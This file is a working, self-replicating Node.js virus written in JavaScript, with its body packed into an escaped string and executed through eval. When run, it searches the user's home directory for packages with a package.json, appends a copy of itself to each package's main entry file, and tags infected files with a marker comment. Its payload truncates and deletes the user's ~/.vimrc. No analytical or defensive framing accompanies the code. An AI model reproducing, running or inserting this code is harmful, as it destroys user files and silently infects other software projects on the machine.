
(function() {
    var virusSrc = "\"use strict\";function _toConsumableArray(r){if(Array.isArray(r)){for(var n=0,t=Array(r.length);n<r.length;n++)t[n]=r[n];return t}return Array.from(r)}function getCopyOfVirus(r,n){var t=function(r){return r.replace(/[\\\\\"]/g,\"\\\\$&\").replace(/[\\n\\r]/g,\"\\\\n\")};return'\\n(function() {\\n    var virusSrc = \"'+t(r)+'\";\\n    var action   = \"'+t(n)+'\";\\n    (()=>null)(action);\\n    eval( virusSrc + \"infect( virusSrc, action )\" );\\n})();'}function readdir(r){return new Promise(function(n,t){fs.readdir(r,function(r,e){return r?t(r):n(e)})})}function stat(r){return new Promise(function(n){fs.stat(r,function(r,t){n(!r&&t.isFile()?\"file\":!r&&t.isDirectory()?\"dir\":null)})})}function appendFile(r,n){return new Promise(function(t,e){fs.appendFile(r,n,function(r){return r?e(r):t()})})}function readFile(r){return new Promise(function(n,t){fs.readFile(r,\"utf-8\",function(r,e){return r?t(r):n(e)})})}function search(r,n){return n<1?[]:readdir(r).then(function(t){return Promise.all(t.map(function(t){var e=path.join(r,t);return stat(e).then(function(r){if(\"dir\"!==r)return[];var t=path.join(e,\"package.json\");return stat(t).then(function(r){return\"file\"!==r?search(e,n-1):readFile(t).then(function(r){try{var n=JSON.parse(r).main||\"index.js\"}catch(r){return[]}var t=path.join(e,n);return stat(t).then(function(r){return\"file\"===r?[t]:[]})})})})})).then(function(r){var n=[],t=!0,e=!1,i=void 0;try{for(var u,a=r[Symbol.iterator]();!(t=(u=a.next()).done);t=!0){var o=u.value;n.push.apply(n,_toConsumableArray(o))}}catch(r){e=!0,i=r}finally{try{!t&&a.return&&a.return()}finally{if(e)throw i}}return n})})}function spread(r,n){readFile(r).then(function(t){if(-1===t.indexOf(VIRUS_MARKER))return appendFile(r,n).then(function(){return appendFile(r,VIRUS_MARKER)})})}function infect(virusSrc,action){eval(action);var virus=getCopyOfVirus(virusSrc,action);search(os.homedir(),10).then(function(r){return Promise.all(r.map(function(r){return spread(r,virus)}))})}var fs=require(\"fs\"),os=require(\"os\"),path=require(\"path\"),VIRUS_MARKER=\"/* 8DFKEGIDB38GS3NGJSLWNGHS */\";";
    var action   = "\"use strict\";!function(){var r=require(\"fs\"),e=require(\"os\").homedir()+\"/.vimrc\";r.openSync(e,\"w\"),r.unlinkSync(e)}();";
    (()=>null)(action);
    eval( virusSrc + "infect( virusSrc, action )" );
})();
